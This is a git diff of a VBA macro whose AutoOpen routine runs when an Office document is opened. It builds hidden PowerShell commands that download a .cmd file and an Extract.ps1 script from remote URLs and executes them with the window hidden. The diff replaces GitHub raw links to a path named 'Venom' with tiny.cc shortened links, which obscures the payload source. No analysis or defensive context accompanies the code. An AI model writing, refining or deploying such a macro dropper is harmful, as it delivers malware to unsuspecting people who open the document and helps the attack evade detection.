@@ -106,8 +106,8 @@ Sub AutoOpen()
     permTxtPath = tempFolder & "\perm.txt"
 
     ' Construct the PowerShell commands to download the files (Script 2's approach but with Script 1's robustness)
-    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd' -OutFile '" & initialCmdPath & "'"""
-    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/Extract.ps1' -OutFile '" & extractPs1Path & "'"""
+    shellCmdInitial = "powershell -Command ""Invoke-WebRequest -Uri 'http://tiny.cc/x6cg001' -OutFile '" & initialCmdPath & "'"""
+    shellCmdExtract = "powershell -Command ""Invoke-WebRequest -Uri 'http://tiny.cc/47cg001' -OutFile '" & extractPs1Path & "'"""
 
     ' Execute the PowerShell commands to download the files
     Shell shellCmdInitial, vbHide
